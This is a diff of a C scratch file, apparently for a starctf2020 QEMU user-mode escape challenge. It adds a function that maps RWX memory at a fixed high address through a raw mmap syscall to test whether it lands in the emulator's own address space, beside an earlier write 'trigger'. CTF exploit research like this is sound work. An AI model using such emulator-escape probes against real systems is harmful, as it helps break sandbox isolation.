@@ -30,11 +30,14 @@ qemu 和 test 两个二进制程序所有缓解措施都打开
 refer: starctf2020(1?), flag2
 */
 
-#include <stdio.h>
-#include <stdlib.h>
+#include <stdint.h>
 #include <unistd.h>
+#include <linux/unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 #include <sys/mman.h>
-
+#include <sys/uio.h>
 void hexdump(const char *desc, void *addr, int len) {
     int i;
     unsigned char buff[17];
@@ -79,8 +82,8 @@ void hexdump(const char *desc, void *addr, int len) {
     // And print the final ASCII bit.
     printf("  %s\n", buff);
 }
-
-int main(){
+int main();
+void test(){
     char buf[0x10];
     
     void *heap = malloc(0x10);
@@ -104,5 +107,15 @@ int main(){
     hexdump(0,addr,0x4);
     *(char *)addr = 0; // trigger
     hexdump(0,addr,0x4);
+}
+
+void test2(){
+    // mmap ret qemuspace!!!
+    uint64_t map = syscall(__NR_mmap, 0x4000000000, 0x200000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    printf("map @ %p\n",map);
+}
+
+int main(){
+    test2();
     return 0;
 }
